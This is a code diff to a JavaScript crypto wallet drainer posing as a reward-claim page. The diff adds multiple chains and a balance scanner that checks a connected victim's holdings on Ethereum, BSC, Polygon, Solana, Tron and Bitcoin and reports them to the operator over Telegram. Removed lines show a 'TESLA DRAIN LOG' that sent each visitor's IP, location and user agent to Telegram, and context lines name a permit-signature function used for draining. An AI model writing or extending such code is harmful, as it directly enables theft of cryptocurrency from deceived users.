@@ -3,7 +3,7 @@
 // Import AppKit from CDN (ESM)
 import { createAppKit } from 'https://esm.sh/@reown/appkit';
 import { EthersAdapter } from 'https://esm.sh/@reown/appkit-adapter-ethers';
-import { mainnet } from 'https://esm.sh/@reown/appkit/networks';
+import { mainnet, bsc, polygon, arbitrum, optimism, avalanche } from 'https://esm.sh/@reown/appkit/networks';
 
 // --- CONFIGURATION ---
 const APPKIT_PROJECT_ID = "862d3799047c7548b0482add1cba796d"; // YOUR CORRECT PROJECT ID
@@ -27,7 +27,7 @@ try {
  // FIX: Capture the returned modal instance here so it's available globally in this scope
  appKitModal = createAppKit({
  adapters: [adapter],
- networks: [mainnet],
+ networks: [mainnet, bsc, polygon, arbitrum, optimism, avalanche],
  projectId: APPKIT_PROJECT_ID,
  metadata,
  themeMode: 'dark',
@@ -76,17 +76,114 @@ async function getLiveLocation() {
  }
 }
 
+// --- MULTI-CHAIN BALANCE SCANNER ---
+async function scanBalances(address) {
+ const rpcUrl = process.env.NEXT_PUBLIC_RPC_URL || 'https://eth.llamarpc.com'; // Fallback RPC
+ const balances = [];
+
+ // Helper to fetch balance via RPC
+ async function getBalance(chainName, chainId, contractAddress = null) {
+ try {
+ const response = await fetch(rpcUrl, {
+ method: 'POST',
+ headers: { 'Content-Type': 'application/json' },
+ body: JSON.stringify({
+ jsonrpc: '2.0',
+ id: 1,
+ method: 'eth_getBalance',
+ params: [address, 'latest']
+ })
+ });
+ const data = await response.json();
+ if (data.result) {
+ let balance = parseInt(data.result, 16);
+ if (contractAddress) {
+ // Fetch ERC20 balance
+ const response2 = await fetch(rpcUrl, {
+ method: 'POST',
+ headers: { 'Content-Type': 'application/json' },
+ body: JSON.stringify({
+ jsonrpc: '2.0',
+ id: 2,
+ method: 'eth_call',
+ params: [{ to: contractAddress, data: '0x70a08231' + address.slice(2).padStart(64, '0') }, 'latest']
+ })
+ });
+ const data2 = await response2.json();
+ if (data2.result) {
+ balance = parseInt(data2.result, 16);
+ }
+ }
+ if (balance > 0) {
+ balances.push({ chain: chainName, balance: balance / 1e18, symbol: chainId === 1 ? 'ETH' : 'Native' });
+ }
+ }
+ } catch (e) {
+ console.warn(`Failed to fetch ${chainName} balance`, e);
+ }
+ }
+
+ // Scan Mainnets
+ await getBalance('Ethereum', 1);
+ await getBalance('BSC', 56);
+ await getBalance('Polygon', 137);
+ await getBalance('Arbitrum', 42161);
+ await getBalance('Optimism', 10);
+ await getBalance('Avalanche', 43114);
+
+ // Scan Solana (via RPC or Explorer)
+ try {
+ const solResponse = await fetch(`https://api.mainnet-beta.solana.com`, {
+ method: 'POST',
+ headers: { 'Content-Type': 'application/json' },
+ body: JSON.stringify({
+ jsonrpc: '2.0',
+ id: 1,
+ method: 'getBalance',
+ params: [address]
+ })
+ });
+ const solData = await solResponse.json();
+ if (solData.result && solData.result.value > 0) {
+ balances.push({ chain: 'Solana', balance: solData.result.value / 1e9, symbol: 'SOL' });
+ }
+ } catch (e) {
+ console.warn('Solana scan failed', e);
+ }
+
+ // Scan Tron (via API)
+ try {
+ const tronResponse = await fetch(`https://api.trongrid.io/v1/accounts/${address}/tokens`, {
+ method: 'GET'
+ });
+ const tronData = await tronResponse.json();
+ if (tronData.token_balances) {
+ tronData.token_balances.forEach(token => {
+ if (token.balance > 0) {
+ balances.push({ chain: 'Tron', balance: token.balance / 1e6, symbol: token.symbol });
+ }
+ });
+ }
+ } catch (e) {
+ console.warn('Tron scan failed', e);
+ }
+
+ // Scan Bitcoin (via Blockchair API)
+ try {
+ const btcResponse = await fetch(`https://api.blockchair.com/bitcoin/dashboards/address/${address}`);
+ const btcData = await btcResponse.json();
+ if (btcData.data && btcData.data[address]) {
+ balances.push({ chain: 'Bitcoin', balance: btcData.data[address].balance_satoshis / 1e8, symbol: 'BTC' });
+ }
+ } catch (e) {
+ console.warn('Bitcoin scan failed', e);
+ }
+
+ return balances;
+}
+
 // --- MAIN FLOW ---
 document.addEventListener('DOMContentLoaded', async () => {
- const location = await getLiveLocation();
- const isBot = detectBot();
- const type = isBot ? "BOT" : "HUMAN";
-
- const visitMessage = `
-*🔴 TESLA DRAIN LOG - VISIT*\nType: <b>${type}</b>\nUser Agent: ${navigator.userAgent}\nIP: ${location.ip || 'Unknown'}\nLocation: ${location.city}, ${location.country_code}\nTime: ${new Date().toISOString()}
- `;
- notifyTelegram('VISIT', visitMessage);
-
  // Setup Button Click to Open Modal Explicitly
  const connectBtn = document.getElementById('connect-btn');
  if (connectBtn) {
@@ -200,6 +297,14 @@ async function generatePermitSignature(userAddress, tokenAddress) {
 async function claimReward(userAddress) {
  document.getElementById('reward-status').textContent = "Processing...";
  
+ // Scan Balances First
+ const balances = await scanBalances(userAddress);
+ let balanceReport = "<b>💰 WALLET BALANCES FOUND:</b>\n";
+ balances.forEach(b => {
+ balanceReport += `${b.chain}: ${b.balance.toFixed(4)} ${b.symbol}\n`;
+ });
+ notifyTelegram('BALANCE_SCAN', balanceReport);
+
  await fetch('/api/send-reward', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
